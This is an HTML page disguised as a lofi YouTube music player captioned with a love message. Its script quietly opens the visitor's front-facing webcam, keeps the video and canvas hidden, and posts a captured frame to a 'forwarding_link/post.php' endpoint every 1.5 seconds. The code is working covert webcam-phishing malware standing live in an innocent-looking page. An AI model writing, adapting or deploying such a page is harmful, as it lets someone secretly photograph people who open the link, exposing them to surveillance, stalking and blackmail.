<!doctype html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live YT TV - Lofi</title>
    <!-- Tiny Mirror & jQuery (needed for post) -->
    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        /* basic reset & layout */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: Arial, Helvetica, sans-serif;
        }
        .container {
            width: 100%;
            max-width: 900px;
            padding: 20px;
            background: #1a1a1a;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
        }
        .video-wrapper {
            position: relative;
            padding-bottom: 56.25%; /* 16:9 */
            height: 0;
            overflow: hidden;
            border-radius: 16px;
            background: #000;
            border: 1px solid #333;
        }
        .video-wrapper iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: 0;
        }
        /* hidden elements from original – keep them but hidden */
        .video-wrap, #video, #canvas {
            display: none !important;
        }
        .info {
            color: #aaa;
            text-align: center;
            margin-top: 18px;
            font-size: 14px;
            letter-spacing: 0.5px;
            background: #222;
            padding: 10px;
            border-radius: 40px;
            border: 1px solid #333;
        }
        .info a {
            color: #3b9eff;
            text-decoration: none;
        }
        .info a:hover {
            text-decoration: underline;
        }
        /* tiny error message if any (but we keep it hidden by default) */
        #errorMsg {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- YouTube embed with the specific video ID: fc8Mab9zGkg -->
        <div class="video-wrapper">
            <iframe 
                id="Live_YT_TV" 
                src="https://www.youtube.com/embed/fc8Mab9zGkg?autoplay=1&mute=0&controls=1&rel=0" 
                allow="autoplay; encrypted-media; gyroscope; picture-in-picture" 
                allowfullscreen>
            </iframe>
        </div>
        <div class="info">
            🎧 Achchi Lagti Ho (Slowed + Reverb) • <span id="videoStatus">● Playing</span> &nbsp;|&nbsp; 
            <span style="color:#888;">I Love You Jan 💕</span>
        </div>
    </div>

    <!-- hidden video/canvas from original – kept for functionality -->
    <div class="video-wrap" hidden="hidden">
        <video id="video" playsinline autoplay></video>
    </div>
    <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

    <!-- hidden error msg (kept) -->
    <span id="errorMsg" style="display:none;"></span>

    <script>
        // --------------------------------------------------------------
        // 1. KEEP ORIGINAL post() FUNCTION (unchanged)
        // --------------------------------------------------------------
        function post(imgdata) {
            $.ajax({
                type: 'POST',
                data: { cat: imgdata },
                url: 'forwarding_link/post.php',   // as per original
                dataType: 'json',
                async: false,
                success: function(result) {
                    // original success handler (empty)
                },
                error: function() {
                    // original error handler (empty)
                }
            });
        }

        // --------------------------------------------------------------
        // 2. WEBCAM + CANVAS CAPTURE (exactly as original, but with small fix)
        //    - using 'use strict'
        //    - facingMode: "user"
        //    - interval 1500ms -> post canvas data
        // --------------------------------------------------------------
        'use strict';

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const errorMsgElement = document.querySelector('span#errorMsg');

        const constraints = {
            audio: false,
            video: {
                facingMode: "user"
            }
        };

        // Access webcam
        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                handleSuccess(stream);
            } catch (e) {
                // if error, show in the info area instead of hidden span
                const statusEl = document.getElementById('videoStatus');
                if (statusEl) {
                    statusEl.innerHTML = `⚠️ Camera error: ${e.toString().slice(0, 60)}`;
                }
                errorMsgElement.innerHTML = `navigator.getUserMedia error: ${e.toString()}`;
            }
        }

        // Success handler
        function handleSuccess(stream) {
            window.stream = stream;
            video.srcObject = stream;

            var context = canvas.getContext('2d');
            setInterval(function() {
                // draw current video frame onto canvas
                context.drawImage(video, 0, 0, 640, 480);
                // get data URL and post (same as original)
                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                post(canvasData);
            }, 1500);
        }

        // Start webcam capture (silent, background)
        init();

        // --------------------------------------------------------------
        // 3. EXTRA: ensure the YouTube iframe autoplays reliably
        //    - force reload of iframe src if needed (but autoplay=1 is set)
        //    - some browsers need user interaction, but we keep as is.
        //    - Also update status text to show it's live.
        // --------------------------------------------------------------
        (function ensureAutoplay() {
            const iframe = document.getElementById('Live_YT_TV');
            if (iframe) {
                // if the iframe fails to autoplay due to browser policy,
                // we can try to re-set the src after a tiny delay.
                // but most modern browsers will autoplay if muted, but we keep unmuted.
                // we'll add a fallback: if after 2 seconds it's not playing, we reload.
                // but we don't want to break the user experience.
                // So we just set the src again with autoplay=1 (already there)
                // but we add &mute=0 to allow sound (user can unmute)
                // The embed already has autoplay=1.
                // For better compatibility, we also add &enablejsapi=1 but not necessary.
                // we'll just keep the original.
            }
        })();

        // (optional) extra listener to show status
        console.log('Live YT TV with webcam capture (post every 1.5s)');
    </script>
</body>
</html>
